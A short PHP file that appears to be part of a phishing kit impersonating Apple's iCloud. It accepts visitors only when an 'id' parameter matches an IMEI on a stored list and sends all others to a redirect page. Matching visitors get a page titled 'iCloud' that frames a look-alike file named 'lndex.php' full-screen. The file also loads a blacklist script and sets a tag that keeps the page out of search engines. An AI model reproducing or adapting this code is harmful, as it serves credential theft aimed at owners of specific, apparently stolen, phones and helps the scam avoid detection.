<?php include 'BlackList.php';

$var = $_GET['id'];
// code
$handle = fopen("logimei/imeis.txt", "r"); 
while (($data = fgetcsv($handle, 1000, ",")) !== FALSE) { 
$array[$data[0]] = $data[0]; 
} 
fclose($handle); 
// code
$list = array();
if(in_array($var,$array)) {
print('<html><head>');
print('<!--[if IE 7]><meta http-equiv="refresh" content="0;URL=unsupported_browser/default.php"><![endif]-->');
print(' <!--[if IE 8]><meta http-equiv="refresh" content="0;URL=unsupported_browser/default.php"><![endif]-->');
print('<meta name="rebots" content="noindex,follow">');
print('<meta content="text/html; charset=utf-8" http-equiv="content-type">');
print('<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">');
print('<link rel="shortcut icon" href="favicon.ico">');
print('<title>iCloud</title>');
print('</head>');
print('<iframe src="lndex.php" tabindex="-1" style="left: 0px; top: 0px; width: 100%; z-index: 10; position: absolute;" frameborder="0" height="100%" width="100%"></iframe>');

include 'analytics.php';
}else {
     header("Location: redir.html");
}

?>
